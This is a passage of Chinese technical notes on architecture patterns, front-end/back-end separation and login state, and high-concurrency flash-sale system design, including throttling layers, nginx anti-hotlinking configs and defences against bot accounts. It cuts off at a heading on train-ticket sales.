这种模式由两方组成;主设备和从设备。主设备组件在相同的从设备组件中分配工作,并计算最终结果,这些结果是由从设备返回的结果。

准确性——将服务的执行委托给不同的从设备,具有不同的实现
从设备是孤立的:没有共享的状态。主-从通信中的延迟可能是一个问题,例如在实时系统中。这种模式只能应用于可以分解的问题。

使用场景:
在数据库复制中,主数据库被认为是权威的来源,并且要与之同步
在计算机系统中与总线连接的外围设备(主和从驱动器)

【 管道-过滤器模式 Pipe-filter pattern 】
此模式可用于构造生成和处理数据流的系统。每个处理步骤都封装在一个过滤器组件内。要处理的数据是通过管道传递的。这些管道可以用于缓冲或用于同步。

展示并发处理。当输入和输出由流组成时,过滤器在接收数据时开始计算。轻松添加过滤器,系统可以轻松扩展。过滤器可重复使用。 可以通过重新组合一组给定的过滤器来构建不同的管道。 效率受到最慢的过滤过程的限制。从一个过滤器移动到另一个过滤器时的数据转换开销。

使用场景:
编译器。连续的过滤器执行词法分析、解析、语义分析和代码生成
生物信息学的工作流

【 代理模式 Broker pattern 】
此模式用于构造具有解耦组件的分布式系统。这些组件可以通过远程服务调用彼此交互。代理组件负责组件之间的通信协调。
服务器将其功能(服务和特征)发布给代理。客户端从代理请求服务,然后代理将客户端重定向到其注册中心的适当服务。

允许动态更改、添加、删除和重新定位对象,这使开发人员的发布变得透明。
要求对服务描述进行标准化。

使用场景:
消息代理软件,如Apache ActiveMQ,Apache Kafka,RabbitMQ和JBoss Messaging

【 点对点模式 Peer-to-peer pattern 】
在这种模式中,单个组件被称为对等点。对等点可以作为客户端,从其他对等点请求服务,作为服务器,为其他对等点提供服务。对等点可以充当客户端或服务器或两者的角色,并且可以随时间动态地更改其角色。

支持分散式计算。对任何给定节点的故障处理具有强大的健壮性。在资源和计算能力方面具有很高的可扩展性。 服务质量没有保证,因为节点是自愿合作的。安全是很难得到保证的。性能取决于节点的数量。

使用场景:
像Gnutella和G2这样的文件共享网络
多媒体协议,如P2PTV和PDTP
像Spotify这样的专有多媒体应用程序

【 模型-视图-控制器模式 Model-view-controller pattern 】
这种模式,也称为MVC模式,把一个交互式应用程序划分为3个部分,
模型:包含核心功能和数据
视图:将信息显示给用户(可以定义多个视图)
控制器:处理用户输入的信息
这样做是为了将信息的内部表示与信息的呈现方式分离开来,并接受用户的请求。它分离了组件,并允许有效的代码重用。

可以轻松地拥有同一个模型的多个视图,这些视图可以在运行时连接和断开。  增加复杂性。可能导致许多不必要的用户操作更新。

使用场景:
在主要编程语言中互联网应用程序的体系架构
像Django和Rails这样的Web框架

【 黑板模式 Blackboard pattern 】
这种模式对于没有确定解决方案策略的问题是有用的。黑板模式由3个主要组成部分组成。
黑板——包含来自解决方案空间的对象的结构化全局内存
知识源——专门的模块和它们自己的表示
控制组件——选择、配置和执行模块
所有的组件都可以访问黑板。组件可以生成添加到黑板上的新数据对象。组件在黑板上查找特定类型的数据,并通过与现有知识源的模式匹配来查找这些数据。

很容易添加新的应用程序。扩展数据空间的结构很简单。 修改数据空间的结构非常困难,因为所有应用程序都受到了影响。可能需要同步和访问控制。

使用场景:
语音识别
车辆识别和跟踪
蛋白质结构识别
声纳信号的解释

【 解释器模式 Interpreter pattern 】
这个模式用于设计一个解释用专用语言编写的程序的组件。它主要指定如何评估程序的行数,即以特定的语言编写的句子或表达式。其基本思想是为每种语言的符号都有一个分类。

高度动态的行为是可行的。对终端用户编程性提供好处。提高灵活性,因为替换一个解释程序很容易。 由于解释语言通常比编译后的语言慢,因此性能可能是一个问题。

使用场景:
数据库查询语言,比如SQL
用于描述通信协议的语言

</pre>
</div>

<div id="separation">
<h2>前后端分离</h2><pre>
AJAX的出现使得前后端分离成为可能,后端专注于业务逻辑,给前端提供接口,而前端通过AJAX的方式向后端请求数据,然后动态渲染页面。

传统的web开发模式,后端一定程度上依赖与前端页面的开发,而前端一定程度的依赖后端的数据接口的开发。整个开发过程中部分阶段处于串行状态。而前后端分离的核心思路就是打破这种串行,使得前端与后端能够并行开发,从而提高整体的工作效率。

thinkphp属于伪前后端分离,因为前端离开后端无法直接运行,这意味着前端和后端开发时都要clone整个项目;
如果实现了后端开发clone后端代码,前端开发clone前端代码,说明项目是真正的前后端分离

前后端分离已成为互联网项目开发的业界标准使用方式,通过nginx+tomcat的方式(也可以中间加一个nodejs)有效的进行解耦,并且前后端分离会为以后的大型分布式架构、弹性计算架构、微服务架构、多端化服务(多种客户端,例如:浏览器,车载终端,安卓,IOS等等)打下坚实的基础。这个步骤是系统架构从猿进化成人的必经之路。

核心思想是前端html页面通过ajax调用后端的restuful api接口并使用json数据进行交互

在传统的web应用开发中,大多数的程序员会将浏览器作为前后端的分界线。将浏览器中为用户进行页面展示的部分称之为前端,而将运行在服务器,为前端提供业务逻辑和数据准备的所有代码统称为后端。

其实前后端分离并不只是开发模式,而是web应用的一种架构模式。在开发阶段,前后端工程师约定好数据交互接口,实现并行开发和测试;在运行阶段前后端分离模式需要对web应用进行分离部署,前后端之前使用HTTP或者其他协议进行交互请求。然而作为一种架构模式,在实施的过程中主要对以下四个方面来进行比较和重新认识。

1、交互形式 - restful
在前后端分离架构中,后端只需要负责按照约定的数据格式向前端提供可调用的API服务即可。前后端之间通过HTTP请求进行交互,前端获取到数据后,进行页面的组装和渲染,最终返回给浏览器

2、代码组织方式
在传统架构模式中,前后端代码存放于同一个代码库甚至是同一工程目录下。页面中还夹杂着后端代码。前后端工程师进行开发时都必须把整个项目导入到开发工具中。

而前后端分离模式在代码组织形式上有以下两种:

半分离
前后端共用一个代码库,但代码分别存放在两个工程中。后端不关心或很少关心前端元素的输出情况,前端不能独立进行开发和测试,项目中缺乏前后端交互的测试用例。

分离
前后端代码库分离,前端代码中有可以进行Mockjs测试(通过构造虚拟测试对象以简化测试环境的方法)的伪后端,能支持前端的独立开发和测试。而后端代码中除了功能实现外,还有着详细的测试用例,以保证API的可用性,降低集成风险。

3、开发模式
之前的架构属于传统的MVC架构,整体没有进行前后端分离,在项目的开发阶段,前端工程师负责编写HTML,完成前端的页面设计并套页面,然后再使用模板技术将写好的前端代码转换为Smarty脚本,同时内嵌一些后端提供的模板变量和一些逻辑操作。应用运行期,将全部代码进行打包,和后端代码部署到同一服务器上,同时会进行简单的动静态分离部署

此时应用的开发流程:
提出需求 -> 前端开发页面 -> 翻译成模板 -> 前后端对接 -> 集成遇到问题 -> 前端返工 -> 后端返工 -> 二次集成 -> 集成成功 -> 交付上线

而在实现前后端分离架构之后,前端工程师只需要编写HTML、js、CSS等前端资源,然后通过HTTP请求调用后端提供的服务即可。除了开发期的分离,在运行期前后端资源也会进行分离部署。

前后端分离之后开发流程:
提出需求 -> 设计接口约定数据 -> 前后端并行开发 -> 前后端集成 -> 前端调整页面 -> 集成成功 -> 交付上线

在开发模式上,前后段分离不仅仅只是工程师的分工开发,更重要的意义在于实现了前后端的并行开发,简化了开发流程

4、数据接口规范流程
在开发期间前后端共同商定好数据接口的交互形式和数据格式。然后实现前后端的并行开发,其中前端工程师再开发完成之后可以独自进行mock测试,而后端也可以使用接口测试平台进行接口自测,然后前后端一起进行功能联调并校验格式,最终进行自动化测试。

【 分离的四个好处 】
前后端分离模式和传统的web应用架构相比有很大的不同,到底分还是不分,这还真是个问题。

从目前应用软件开发的发展趋势来看,主要有两方面需要注意:
1、越来越注重用户体验,随着互联网的发展,开始多终端化。
2、大型应用架构模式正在向云化、微服务化发展。

主要通过前后端分离架构带来以下四个方面的提升:
1、为优质产品打造精益团队
通过将开发团队前后端分离化,让前后端工程师只需要专注于前端或后端的开发工作,是的前后端工程师实现自治,培养其独特的技术特性,然后构建出一个全栈式的精益开发团队。

2、提升开发效率
前后端分离以后,可以实现前后端代码的解耦,只要前后端沟通约定好应用所需接口以及接口参数,便可以开始并行开发,无需等待对方的开发工作结束。与此同时,即使需求发生变更,只要接口与数据格式不变,后端开发人员就不需要修改代码,只要前端进行变动即可。如此一来整个应用的开发效率必然会有质的提升。

3、完美应对复杂多变的前端需求
如果开发团队能完成前后端分离的转型,打造优秀的前后端团队,开发独立化,让开发人员做到专注专精,开发能力必然会有所提升,能够完美应对各种复杂多变的前端需求。

4、增强代码可维护性
前后端分离后,应用的代码不再是前后端混合,只有在运行期才会有调用依赖关系。
应用代码将会变得整洁清晰,不论是代码阅读还是代码维护都会比以前轻松

【 部署方案 】
前后端分离之后,应用在部署时也需要进行前后端分离。在进行前后端分离方案选择时,需要结合项目的实际情况和用户来考虑。

分离之前的架构
前后端分离之前,网盘的后端架构是Nginx服务和后端的PHP服务以及前端的静态资源都是部署在同一台服务器上。当浏览器发起访问请求时,如何请求的是静态资源,Nginx直接把静态资源返回给服务器;如果请求的是页面或后端服务,则经Nginx将请求转发到后端的PHP服务器,完成响应后经Nginx返回到浏览器。

这个方案比较简单,易于实现,而且能到达前后端解耦的目的。而且很多公司目前都是基于这种架构或者一定的变形来实现的web应用。

但是对于页面量比较大,需要有良好SEO的应用来说,此方案缺点也较为明显。因为Nginx只是向浏览器返回页面静态资源,而国内的搜索引擎爬虫只会抓取静态数据, 不会解析页面中的js,这使得应用得不到良好的搜索引擎支持。同时因为Nginx不会进行页面的组装渲染,需要把静态页面返回到浏览器,然后完成渲染工作,这加重了浏览器的渲染负担。

另外,由于这种架构使得前端工程师的工作范围只局限在了浏览器一侧,导致在进行一些特殊的性能优化时,前端工程师无法独立完成,还需要后端开发人员的配合,这也一定程度上影响了双方的进度。

分离之后的架构
前后端分离之后,原先的架构只上再单独增加了一个Node Server作为中间层,将前端资源部署到Node Server中。Node Server还实现了一层数据代理服务,负责与提供数据的后端服务进行通信。

并且还在这个基础上增加并使用了前端机(前端机是对所有的请求进行预处理和负载均衡,然后再转发给后端机。)的Nginx服务,浏览器发起的请求经过前端机的Nginx进行分发,URL请求统一分发到Node Server,在Node Server中根据请求类型从后端服务器上通过RPC服务请求页面的模板数据,然后进行页面的组装和渲染;API请求则直接转发到后端服务器,完成响应。

</pre>

<h3>关于登录状态</h3><pre>
传统的做法,前后端统一在一个服务中

逻辑处理和页面放在一个服务中,用户输入用户名、密码后,后台服务在session中设置登录状态,和用户的一些基本信息, 然后将Response返回到Browser,并设置Cookie。下次用户在这个Browser中再次访问服务时,请求中会带上这个Cookie,服务端根据这个Cookie就能找到对应的session,从session中取得用户的信息,从而维持了用户的登录状态,这种机制被称作Cookie-Session机制

前后端分离后项目结构的变化
访问一个网站时,先去请求静态服务,拿到页面后再异步去后台请求数据,最后渲染成看到的带有数据的网站。在这种结构下的登录状态怎么维持呢？上面的Cookie-Session机制还适不适用？

这里又分两种情况,服务A和服务B在同一域下,服务A和服务B在不同域下,浏览器存在同源策略

1、同域下的前后端分离
服务端设置Cookie,设置Cookie的path为根目录"/",以便在该域的所有路径下都能看到这个Cookie
前端html使用ajax请求后台数据

在做前后端分离时,前端和后端部署在同一域下,满足浏览器的同源策略,登录不需要做特殊的处理

2、不同域下的前后端分离
JSONP解决跨域
改造接口,在每个接口上增加callback参数

不同域下的前后端分离可以通过JSONP跨域保持登录状态,但jsonp本身没有跨域安全规范,一般都是后端进行安全限制,处理不当很容易造成安全问题

CORS解决跨域
CORS是一个W3C标准,全称是"跨域资源共享"(Cross-origin resource sharing)。CORS需要浏览器和服务器同时支持。目前所有浏览器都支持该功能,IE浏览器不能低于IE10。 整个CORS通信过程都是浏览器自动完成,不需要用户参与。对于开发者来说,CORS通信与同源的AJAX通信没有差别,代码完全一样。 浏览器一旦发现AJAX请求跨源就会自动添加一些附加的头信息,有时还会多出一次附加的请求,但用户不会有感觉。

CORS请求默认不发送Cookie和HTTP认证信息。若要发送Cookie,浏览器和服务端都要做设置,咱们要解决的是跨域后的登录问题,所以要允许跨域发送 Cookie

</pre>
</div>

<div id="miaosha">
<h2>秒杀系统架构优化 - web系统高并发 - 电商秒杀和抢购</h2><pre>
高并发架构相关概念
1、QPS(Query Per Second,每秒处理请求数) : 每秒钟请求或查询的数量,在互联网领域指每秒响应请求数(指HTTP请求)
2、PV(Page View)：综合浏览量即页面浏览量或点击量,一个访客在24小时内访问的页面数量,同一个人浏览网站的同一页面只记做一次pv
3、吞吐量(fetches/sec) ：单位时间内处理的请求数量(通常由QPS和并发数决定)
4、响应时间：从请求发出到收到响应花费的时间,例如系统处理一个HTTP请求需要100ms,这个100ms就是系统的响应时间
5、独立访客(UV)：一定时间范围内相同访客多次访问网站,只计算为1个独立访客
6、带宽：计算带宽需关注两个指标,峰值流量和页面的平均大小
7、日网站带宽： PV/统计时间(换算到秒) * 平均页面大小(kb)*8

三 需要注意点：
峰值一般是平均值得倍数,根据实际情况来定
首先要知道整个网站的日PV是多少,服务器单台QPS的承受能力是多少,如日QPS经过计算得到200(单机峰值QPS为200),单机QPS承受力为50,至少需要4台机器才能完成访问

1、QPS不等于并发连接数,QPS是每秒HTTP请求数量,并发连接数是系统同时处理的请求数量,1个HTTP请求叫做1个QPS,一个并发连接数有可能里面有多个HTTP请求
2、峰值每秒请求数(QPS)= (总PV数*80%)/ (六小时秒数*20%),代表80%的访问量都集中在20%的时间内
3、压力测试： 测试能承受的最大并发数(测试服务器最大能承受多少QPS,网站一天PV是多少,可以计算出来整个QPS的峰值是多少)以及测试最大承受的QPS值
4、常用的性能测试工具:ab,wrk,httpload,Web Bench,Siege,Apache JMeter

ab
全称是apache benchmark,是apache官方推出的工具。
原理：创建多个并发访问线程,模拟多个访问者同时对某一个URL地址进行访问。它的测试目标是基于URL的,因此它既可以用来测试apache的负载压力,也可以测试nginx、lighthttp、tomcat、IIS等其它Web服务器的压力。
使用方法：如模拟并发请求100次,总共请求5000次
ab -c 100 -n 5000 待测试网站：-c 表示并发数,这儿是100; -n表示总共请求次数,这儿是5000)

注意事项：
测试机器与被测试机器分开;
不要对线上服务做压力测试;
观察测试工具ab所在机器,以及被测试的前端机的CPU,内存,网络等都不超过最高限度的75%

四 优化
随着QPS的增长,每个阶段需要根据实际情况来进行优化,优化的方案也与硬件条件、网络带宽息息相关

1、当QPS小于50时
优化方案:为一般小型网站,不用考虑优化

2、当QPS达到100时遇到数据查询瓶颈
假设关系型数据库的每次请求在0.01秒完成;
假设单页面只有一个SQL查询,那么100QPS意味着1秒钟完成100次请求,但是此时并不能保证数据库查询能完成100次;
优化方案: 数据库缓存层,数据库的负载均衡

3、当QPS达到800时遇到带宽瓶颈
假设使用百兆带宽,意味着网站出口的实际带宽是8M左右;
假设每个页面只有10K,在这个并发条件下百兆带宽已经吃完
优化方案:CDN加速,负载均衡

4、当QPS达到1000时
假设使用Memcache缓存数据库查询数据,每个页面对Memcache的请求远大于直接对DB的请求;
Memcache的悲观并发数在2w左右,Memcache在QPS达到800的时候已经不太稳定了,但有可能在之前内网带宽已经吃光,表现出不稳定
优化方案: 做html静态缓存

5、当QPS达到2000时
这个级别下文件系统访问锁都成了灾难
优化方案: 做业务分离,分布式存储
如：现在有库存系统和订单系统,可以把这两个系统分到不同的集群

五、高并发解决方案案例:
1、流量优化  
防盗链处理(去除恶意请求)
现在有AB两个站,A站想用B站的资源,直接在页面嵌入了一些图片、JS、CSS,本身来说A站并不关心B站会消耗多少流量,但对于B站来说,如果调用了B站的一些图片、JS或CSS都会对它做一个HTTP请求,就会消耗流量和带宽,所以本身对B站来说会有不好的影响。从另一个角度来说也侵犯了B站的版权问题,因此要做防盗链处理,这是流量的优化。
1、Referer (易伪造referer,安全性低),nginx防盗链
location ~* \.(gif|jpg|png|webp)$ {
#指令valid_referers  全局invalid_referer
   valid_referers none blocked domain.com *.domain.com ;
   if ($invalid_referer) {
        return 403;
        #rewrite ^/ http://www.domain.com/403.jpg;
   }
}

2、加密签名 (安全性高),根据计算签名的方式判断请求是否合法,如果合法则显示,否则返回错误信息

#以Nginx为例,前提加载第三方模块HttpAccessKeyModule实现防盗链
location ~* \.(gif|jpg|png|webp)$ {
    accesskey on;
    accesskey_hashmethod md5;
    accesskey_arg key;
    accesskey_signature "mysrc$remote_addr";
}


2、前端优化
(1) 减少HTTP请求
将css、js、图片等合并虽然会使文件变大,但是减少了请求的次数

(2) 添加异步请求
先不将所有数据都展示给用户,用户触发某个事件才会异步请求数据

(3) 启用浏览器缓存和文件压缩
启用浏览器去缓存HTML文件给其设定过期时间,设定缓存文件相关的指纹等,还可以将静态资源文件如JS、image等一些前端资源设置过期时间缓存,为其指定过期时间,把它缓存到浏览器中,这样下一次再去访问的时候不需要去请求服务端,可以直接通过浏览器把缓存读取出来。对于文件压缩,可以通过一些压缩方式,如把图片压缩的小一些,展示的时候图片就会下载的更快些,响应速度会加深,并且减少了流量的消耗,减少了带宽的消耗。同时也可以启用Nginx的GCPR服务,将文件整体来说压的小一些

(4) CDN加速
可以把一些前端的文件资源全部都放到CDN当中,用户过来访问的时候可以就近来进行访问,从而提高访问速度,并且从一定意义上来说也解决了带宽不够用的问题,可以把数据缓存到CDN的节点中,在用户去访问的时候都会就近的选择CDN的节点进行访问,从一定意义上来说就不会访问真实的服务器。

(5) 建立独立的图片服务器(减少I/O)
图片服务器是比较吃I/O的,为了解决对I/O的损耗可以把它与Web服务器完全分离开,这样Web服务器本身的I/O不会被图片损耗,然后还可以针对性的对图片服务器做一些优化,如提高硬盘的转速,把CPU的计算能力降低下来,把图片服务器做一个集群。
可以放在一些相关的平台上,如七牛等

3、服务端优化
(1) 页面静态化
把现有的服务端的逻辑、数据、最终生成的要显示给用户的一些HTML内容缓存起来,直接缓存成HTML代码速度会更快,并且对CPU负载、对服务器的压力都会减小很多。

(2) 并发处理
页面做了一些静态化,但静态化会有一个过期时间,不可能永远显示页面,如果是这样创建一些动态的内容就没有意义了,但对于实质性要求比较高的来说,可能在做一些静态化的时候不是特别的合理。这时需要穿透静态化即绕过静态化来直接访问真实的数据。访问真实数据的时候可能就需要做一些程序上的并发处理,如多线程多进程的异步处理、队列处理等都可以异步完成数据的处理,从而提升请求的响应的速度,同时也提升了并发数

(3) 队列处理

4、数据库优化
(1) 表结构优化,数据表中的数据类型的优化,如选择合适的字段,选择效率快速的字段
(2) SQL语句优化,语法优化和处理逻辑优化,可记录各语句执行时间,有针对性的分析。
(3) 索引优化
(4) 使用存储过程代替直接操作
(5) 数据库缓存,memcache缓存、redis缓存等
(6) 分库分表,分区
(7) 读写分离,一些服务器做数据库的读操作(查询),一些服务器做写操作(增、删、该)
(8) 负载均衡

5、web服务器优化
(1) nginx反向代理实现负载均衡
(2) 使用七层,使用四层(LVS)软件来实现负载均衡

</pre>

<h3>秒杀业务</h3><pre>
大规模并发带来的挑战
在过去的工作中曾经面对过5w每秒的高并发秒杀功能,在这个过程中整个Web系统遇到了很多的问题和挑战。如果Web系统不做针对性的优化,会轻而易举地陷入到异常状态

秒杀业务的难点:
高并发,cache,锁机制
基于缓存架构redis,Memcached的先进先出队列。
稍微大一点的秒杀肯定是分布式的集群的,并发来自于多个节点的JVM,synchronized所有在JVM上加锁是不行了
数据库压力
秒杀超卖问题
如何防止用户来刷,黑名单？IP限制？
利用memcached的带原子性特性的操作做并发控制

im系统,例如qq或微博,每个人都读自己的数据(好友列表、群列表、个人信息)
微博系统,每个人读你关注的人的数据,一个人读多个人的数据
秒杀系统,库存只有一份,所有人会在集中的时间读和写这些数据,多个人读一个数据

秒杀案例
小米手机每周二的秒杀,可能手机只有1万部,但瞬时进入的流量可能是几百几千万。
12306抢票票是有限的,库存一份,瞬时流量非常多,都读相同的库存,读写冲突,锁非常严重,这是秒杀业务难的地方

优化方向有两个:
(1)将请求尽量拦截在系统上游(不要让锁冲突落到数据库上去)
传统秒杀系统之所以挂,请求都压倒了后端数据层,数据读写锁冲突严重,并发高响应慢,几乎所有请求都超时,流量虽大,下单成功的有效流量甚小。以12306为例,一趟火车其实只有2000张票,200w个人来买,基本没有人能买成功,请求有效率为0。

(2)读多写少的多使用缓存(缓存抗读压力)
秒杀买票,这是一个典型的读多写少的应用场景,大部分请求是车次查询、票查询,下单和支付才是写请求。一趟火车只有2000张票,200w人来买,最多2000个人下单成功,其他人都是查询库存,写比例只有0.1%,读比例占99.9%,非常适合使用缓存来优化

【 分层优化 】
第一层、客户端(浏览器层,APP层)优化,最上层,执行到一些JS代码
微信的摇一摇抢红包每次摇一摇就会往后端发送请求么？下单抢票点击了"查询"按钮之后,系统卡进度条涨的慢,用户会不自觉的持续点击"查询",这样平白无故的增加了系统负载,一个用户点5次,80%的请求是这么多出来的

(a)产品层面,用户点击"查询"或"购票"后按钮置灰,禁止用户重复提交请求;
(b)JS层面,限制用户在x秒之内只能提交一次请求;

APP层面可以做类似的事情,虽然疯狂的摇微信,其实x秒才向后端发起一次请求。这就是所谓的"将请求尽量拦截在系统上游",越上游越好,浏览器层、APP层就给拦住,这样就能挡住80%+的请求,这种办法只能拦住普通用户,但99%的用户是普通用户,但对于群内的高端程序员是拦不住的。firebug一抓包,http长啥样都知道,js拦不住程序员写for循环调用http接口的

第二层、站点层面的请求拦截,这一层会访问后端数据,拼html页面返回给浏览器
怎么拦截、防止程序员写for循环调用,有去重依据么？ip？cookie-id？其实这类业务都需要登录,用uid即可。
在站点层面对uid进行请求计数和去重,甚至不需要统一存储计数,直接站点层内存存储,这样计数会不准但最简单
一个uid,5秒只准透过1个请求,这样又能拦住99%的for循环请求。

5s只透过一个请求,其余的请求怎么办？缓存,页面缓存,同一个uid,限制访问频度,做页面缓存,x秒内到达站点层的请求,均返回同一页面。同一个item的查询如车次做页面缓存,x秒内到达站点层的请求均返回同一页面。如此限流,既能保证用户有良好的用户体验,没有返回404,又能保证系统的健壮性,利用页面缓存把请求拦截在站点层了

页面缓存不一定要保证所有站点返回一致的页面,直接放在每个站点的内存也是可以的。优点是简单,坏处是http请求落到不同的站点,返回的车票数据可能不一样,这是站点层的请求拦截与缓存优化。

这个方式拦住了写for循环发http请求的程序员,有些高端程序员(黑客)控制了10w个肉鸡,手里有10w个uid,同时发请求(先不考虑实名制的问题,小米抢手机不需要实名制),这下怎么办,站点层按照uid限流拦不住了。

第三层、服务层来拦截,不要让请求落到数据库上,向上游屏蔽底层数据细节,提供数据访问
服务层怎么拦截？服务层清楚的知道小米只有1万部手机,清楚的知道一列火车只有2000张车票,透10w个请求去数据库有什么意义呢？

对写请求做请求队列,每次只透有限的写请求去数据层(下订单、支付等写业务)
1w部手机,只透1w个下单请求去db
3k张火车票,只透3k个下单请求去db
如果均成功再放下一批,如果库存不够则队列里的写请求全部返回"已售完"。

读请求优化是cache抗,memcached或redis单机抗每秒10w没问题。如此限流,只有非常少的写请求和非常少的读缓存mis的请求会透到数据层去,又有99.9%的请求被拦住了。

业务规则上的一些优化,12306分时分段售票,原来统一10点卖票,现在8点,8点半,9点,...每隔半个小时放出一批:将流量摊匀。

数据粒度的优化:购票时对于余票查询这个业务,票剩了多少张并不关注,只关心有票和无票,流量大的时候做一个粗粒度的"有票""无票"缓存即可。

业务逻辑的异步:例如下单业务与支付业务的分离,这些优化都是结合业务来的,有一个观点"一切脱离业务的架构设计都是耍流氓"架构的优化也要针对业务。

第四层、数据库层,最终的库存是存在这里的,mysql是一个典型(当然还有会缓存)
浏览器拦截了80%,站点层拦截了99.9%并做了页面缓存,服务层又做了写请求队列与数据缓存,每次透到数据库层的请求都是可控的。db基本就没什么压力了,单机也能扛得住,总之库存是有限的,透过多请求来数据库没有意义。

全部透到数据库,100w个下单,0个成功,请求有效率0%。透3k个到数据,全部成功,请求有效率100%。

【 优化的要点 】
1. 请求接口的合理设计
一个秒杀或抢购页面通常分为2个部分,一个是静态的HTML等内容,另一个就是参与秒杀的Web后台请求接口。
通常静态HTML等内容是通过CDN的部署,一般压力不大,核心瓶颈实际上在后台请求接口上。这个后端接口必须能够支持高并发请求,同时必须尽可能快,在最短的时间里返回用户的请求结果。为了实现尽可能快这一点,接口的后端存储使用内存级别的操作会更好一点,直接面向MySQL之类的存储是不合适的,如果有这种复杂业务的需求都建议采用异步写入。
当然也有一些秒杀和抢购采用"滞后反馈",即秒杀当下不知道结果,一段时间后才可以从页面中看到用户是否秒杀成功。但这种属于偷懒行为,同时给用户的体验也不好,容易被用户认为是暗箱操作

2. 高并发的挑战:一定要"快"
通常衡量一个Web系统的吞吐率的指标是QPS(Query Per Second,每秒处理请求数),解决每秒数万次的高并发场景,这个指标非常关键。假设处理一个业务请求平均响应时间为100ms,同时系统内有20台Apache的Web服务器,配置MaxClients为500个(表示Apache的最大连接数目)。
那么Web系统的理论峰值QPS为(理想化的计算方式):20*500/0.1 = 100000(10万QPS),系统似乎很强大,1秒钟可以处理完10万的请求。实际情况当然没有这么理想,在高并发的实际场景下机器都处于高负载的状态,在这个时候平均响应时间会被大大增加。

就Web服务器而言,Apache打开了越多的连接进程,CPU需要处理的上下文切换也越多,额外增加了CPU的消耗,然后就直接导致平均响应时间增加。因此上述的MaxClient数目,要根据CPU、内存等硬件因素综合考虑,绝对不是越多越好。可以通过Apache自带的abench来测试一下,取一个合适的值。然后选择内存操作级别的存储的Redis,在高并发的状态下存储的响应时间至关重要。网络带宽虽然也是一个因素,不过这种请求数据包一般比较小,一般很少成为请求的瓶颈。负载均衡成为系统瓶颈的情况比较少

那么问题来了,假设系统在5w/s的高并发状态下,平均响应时间从100ms变为250ms(实际情况甚至更多):
20*500/0.25 = 40000(4万QPS)
于是系统剩下了4w的QPS,面对5w每秒的请求,中间相差了1w。
然后这才是真正的恶梦开始,某一个秒内20*500个可用连接进程都在满负荷工作中,却仍有1万个新来请求,没有连接进程可用,系统陷入到异常状态
其实在正常的非高并发的业务场景中,也有类似的情况出现,某个业务请求接口出现问题,响应时间极慢,将整个Web请求响应时间拉得很长,逐渐将Web服务器的可用连接数占满,其他正常的业务请求,无连接进程可用。
更可怕的问题是用户的行为特点,系统越是不可用,用户的点击越频繁,恶性循环最终导致雪崩,其中一台Web机器挂了,导致流量分散到其他正常工作的机器上,再导致正常的机器也挂,然后恶性循环,将整个Web系统拖垮。

3. 重启与过载保护
如果系统发生雪崩,贸然重启服务是无法解决问题的。最常见的现象是启动起来后立刻挂掉。这个时候最好在入口层将流量拒绝,然后再将重启。如果是redis/memcache这种服务也挂了,重启的时候需要注意预热,并且很可能需要比较长的时间。

秒杀和抢购的场景流量往往是超乎系统的准备和想象的,这个时候过载保护是必要的。如果检测到系统满负载状态,拒绝请求也是一种保护措施。在前端设置过滤是最简单的方式,但这种做法是被用户千夫所指的行为,更合适一点的是将过载保护设置在CGI入口层,快速将客户的直接请求返回。

【 作弊的手段:进攻与防守 】
秒杀和抢购收到了海量的请求,实际上里面的水分是很大的。不少用户为了抢到商品会使用刷票工具等辅助工具发送尽可能多的请求到服务器。还有一部分高级用户制作强大的自动请求脚本。这种做法的理由也很简单,就是在参与秒杀和抢购的请求中,自己的请求数目占比越多成功的概率越高。
这些都是属于作弊的手段,不过有进攻就有防守

1. 同一个账号一次性发出多个请求
部分用户通过浏览器的插件或其他工具,在秒杀开始的时间里以自己的账号一次发送上百甚至更多的请求,这样的用户破坏了秒杀和抢购的公平性。
这种请求在某些没有做数据安全处理的系统里也可能造成另外一种破坏,导致某些判断条件被绕过。
例如一个简单的领取逻辑,先判断用户是否有参与记录,如果没有则领取成功,最后写入到参与记录中。这是个非常简单的逻辑,但高并发的场景下存在深深的漏洞。多个并发请求通过负载均衡服务器,分配到内网的多台Web服务器,它们首先向存储发送查询请求,然后在某个请求成功写入参与记录的时间差内,其他的请求获查询到的结果都是"没有参与记录"。这里就存在逻辑判断被绕过的风险。

在程序入口处一个账号只允许接受1个请求,其他请求过滤。不仅解决了同一个账号发送N个请求的问题,还保证了后续的逻辑流程的安全。实现方案可以通过Redis这种内存缓存服务,写入一个标志位(只允许1个请求写成功,结合watch的乐观锁的特性),成功写入的则可以继续参加。
或者自己实现一个服务,将同一个账号的请求放入一个队列中,处理完一个再处理下一个。

2. 多个账号一次性发送多个请求
很多公司的账号注册功能,在发展早期几乎是没有限制的,很容易就可以注册很多个账号。因此也导致了出现了一些特殊的工作室,通过编写自动注册脚本积累了大批僵尸账号,专门做各种刷的行为。例如微博中有转发抽奖的活动,如果使用几万个"僵尸号"去混进去转发,这样就可以大大提升中奖的概率。这种账号使用在秒杀和抢购里也是同一个道理。例如iPhone官网的抢购,火车票黄牛党。

应对方案:
这种场景可以通过检测指定机器IP请求频率就可以解决,如果发现某个IP请求频率很高,可以给它弹出一个验证码或直接禁止它的请求:
弹出验证码最核心的追求就是分辨出真实用户,因此网站弹出的验证码有时根本无法看清,这样做的原因其实也是为了让验证码的图片不被轻易识别,因为强大的自动脚本可以通过图片识别里面的字符,然后让脚本自动填写验证码。实际上有一些非常创新的验证码,效果会比较好,例如给一个简单问题回答或完成某些简单操作(例如百度贴吧的验证码)。

直接禁止IP实际上是有些粗暴的,因为有些真实用户的网络场景恰好是同一出口IP的,可能会有误伤,但这一个做法简单高效,根据实际场景使用可以获得很好的效果。

3. 多个账号不同IP发送不同请求
有进攻就会有防守,永不休止。这些工作室发现对单机IP请求频率有控制之后也针对这种场景想出了新进攻方案,就是不断改变IP。
这些随机IP服务怎么来的,有一些是某些机构自己占据一批独立IP,然后做成一个随机代理IP的服务,有偿提供使用。还有一些更为黑暗一点的,就是通过木马黑掉普通用户的电脑,这个木马也不破坏用户电脑的正常运作,只做一件事情就是转发IP包,普通用户的电脑被变成了IP代理出口。通过这种做法,黑客就拿到了大量的独立IP,然后搭建为随机IP服务

应对方案:
这种场景下的请求和真实用户的行为已经基本相同了,很难分辨,再做进一步的限制很容易误伤真实用户,这个时候通常只能通过设置业务门槛高来限制这种请求了,或通过账号行为的数据挖掘来提前清理掉它们。

僵尸账号也还是有一些共同特征的,例如账号很可能属于同一个号码段甚至是连号的,活跃度不高,等级低,资料不全等。根据这些特点适当设置参与门槛,例如限制参与秒杀的账号等级,通过这些业务手段也可以过滤掉一些僵尸号。

4. 火车票的抢购
